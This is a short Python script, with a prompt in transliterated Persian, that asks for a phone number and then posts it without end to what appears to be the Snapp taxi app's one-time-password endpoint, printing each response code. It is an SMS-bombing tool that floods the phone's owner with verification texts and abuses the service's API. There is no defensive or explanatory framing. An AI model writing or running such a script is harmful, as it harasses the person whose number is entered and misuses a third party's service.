import requests 


Enter = input("Shomare ra vared konid :")


while True:
    url = 'https://app.snapp.taxi/api/api-passenger-oaauth/v2/otp'
    number = {"cellphone":"+98"+Enter}
    sms = requests.post(url,data=number)
    print(sms.status_code)



